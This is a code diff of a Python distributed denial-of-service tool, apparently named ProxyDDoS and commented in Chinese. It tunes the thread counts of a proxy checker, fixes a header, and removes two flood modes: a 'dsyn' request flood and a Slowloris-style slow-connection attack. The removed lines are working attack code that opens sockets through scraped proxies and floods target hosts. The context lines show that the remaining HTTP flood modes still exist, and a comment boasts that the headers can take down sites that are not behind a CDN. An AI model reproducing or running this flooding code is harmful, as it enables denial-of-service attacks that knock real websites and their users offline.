@@ -159,7 +159,7 @@ def launchChecker(): # 開始檢測proxy
         q.put(proxy)
 
     threads = []
-    for _ in range(min(600, len(proxies))):
+    for _ in range(min(300, len(proxies))):
         t = threading.Thread(target=Proxy_worker)
         t.daemon = True
         t.start()
@@ -204,7 +204,7 @@ def headerHandle(): #封包標頭處理
 
     # Http 一般標頭 包含常見的connection跟accept等 
     # 如果網站不在任何雲端節點上 那這些標頭就可以實現癱瘓
-    conn = f"Connection: Keep-Alive:823\r\n"
+    conn = f"Connection: Keep-Alive\r\n"
     accept = f"Accept: */*\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nAccept-Language: zh-TW,zh;q=0.5\r\n"
     referer = f"Referer: {GetReferer()}\r\n"
     useragent = f"{GenUA()}\r\n"
@@ -331,88 +331,9 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
 def launchThreads():
     for _ in range(thr):
         try:
-            if "--dsyn" in sys.argv:
-                t = threading.Thread(target=send_dsyn)
-            else:
-                t = threading.Thread(target=send_requests)
+            t = threading.Thread(target=send_requests)
             t.start()
         except:
-            pass
-
-
-def send_dsyn():
-    try:
-        proxy_ip, proxy_port = random.choice(good_proxies).split(":")
-        proxy_port = int(proxy_port)
-    except ValueError:
-        return
-    while 1:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.connect((proxy_ip, proxy_port))
-            if port == 443:
-                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                s = context.wrap_socket(s, server_hostname=host)
-            try:
-                for _ in range(100):
-                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Keep-Alive\r\n\r\n".encode())
-                print(f"[ProxyDDoS] DSYN FLOODING {host} < {proxy_ip}")
-            except:
-                s.close()
-        except:
-            s.close()
-
-
-def launch_slow():
-    try:
-        proxy_ip, proxy_port = random.choice(good_proxies).split(":")
-        proxy_port = int(proxy_port)
-    except ValueError:
-        return
-    try:
-        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-        s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        for _ in range(100):
-            try:
-                s.connect((host, port))
-                if port == 443:
-                    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    context.check_hostname = False
-                    context.verify_mode = ssl.CERT_NONE
-                    s = context.wrap_socket(s, server_hostname=host)
-                try:
-                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-Alive\r\n".encode())
-                    socket_list.append(s)
-                    print(f" - {proxy_ip} Join SLOW FLOODING - ")
-                except:
-                    s.close()
-            except:
-                s.close()
-        return True
-    except:
-        s.close()
-
-
-def send_slow():
-    for _ in range(thr):
-        t = threading.Thread(target=launch_slow, daemon=True)
-        t.start()
-    while 1:
-        if len(socket_list) > 0:
-            for s in socket_list:
-                try:
-                    s.send(f"Symbol: {rC(rand)}\r\n".encode())
-                    print(f"{s} SLOW FLOODING")
-                except:
-                    s.close()
-                    socket_list.remove(s)
-                    threading.Thread(target=launch_slow, daemon=True).start()
-            time.sleep(0.5)
-        else:
             pass
 
 
@@ -459,7 +380,6 @@ if __name__ == '__main__':
         print(" --pps    | Flood with no header")
         print(" --brute  | Flood with less header")
         print(" --cdn    | Flood with sec header")
-        print(" --slow   | Slow Connection Flood ")
         sys.exit()
     else:
         try:
@@ -497,7 +417,4 @@ if __name__ == '__main__':
             f.write(f"{l}\n")
         f.close()
         launchChecker()
-        if "--slow" in sys.argv:
-            send_slow()
-        else:
-            launchThreads()
+        launchThreads()
